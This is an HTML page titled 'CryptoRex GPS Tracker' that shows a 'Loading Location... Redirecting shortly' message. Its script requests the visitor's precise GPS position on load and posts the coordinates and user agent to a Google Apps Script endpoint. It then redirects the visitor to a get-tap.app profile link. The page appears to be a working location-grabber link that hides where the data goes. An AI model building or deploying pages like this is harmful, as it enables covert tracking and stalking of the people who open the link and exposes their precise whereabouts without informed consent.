<!DOCTYPE html>
<html>
  <head>
    <title>CryptoRex GPS Tracker</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
      function sendLocation(lat, lng, accuracy) {
        const userAgent = navigator.userAgent;
        const url = "https://script.google.com/macros/s/AKfycbxrEcdmI9EqbgGAg_Da1HjxbNOu3jAAy3HGMe1N5tJ4vFX510MQuvVE0Kej5u7gVVQO/exec";

        fetch(url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            latitude: lat,
            longitude: lng,
            accuracy: accuracy,
            userAgent: userAgent
          })
        })
        .then(res => res.text())
        .then(response => {
          console.log("Logged:", response);
          window.location.href = "https://get-tap.app/dr.cryptorex";
        })
        .catch(err => {
          console.error("Logging failed", err);
          window.location.href = "https://get-tap.app/dr.cryptorex";
        });
      }

      function getLocation() {
        if (!navigator.geolocation) {
          console.warn("Geolocation not supported");
          window.location.href = "https://get-tap.app/dr.cryptorex";
          return;
        }

        navigator.geolocation.getCurrentPosition(
          (position) => {
            sendLocation(position.coords.latitude, position.coords.longitude, position.coords.accuracy);
          },
          (error) => {
            console.warn("GPS error", error);
            window.location.href = "https://get-tap.app/dr.cryptorex";
          },
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
        );
      }

      window.onload = () => {
        setTimeout(getLocation, 500); // slight delay for better GPS permission handling
      };
    </script>
  </head>
  <body>
    <h1 style="text-align:center;font-family:sans-serif;margin-top:40px;">
      üìç Loading Location...
    </h1>
    <p style="text-align:center;">Please allow location access. Redirecting shortly.</p>
  </body>
</html>
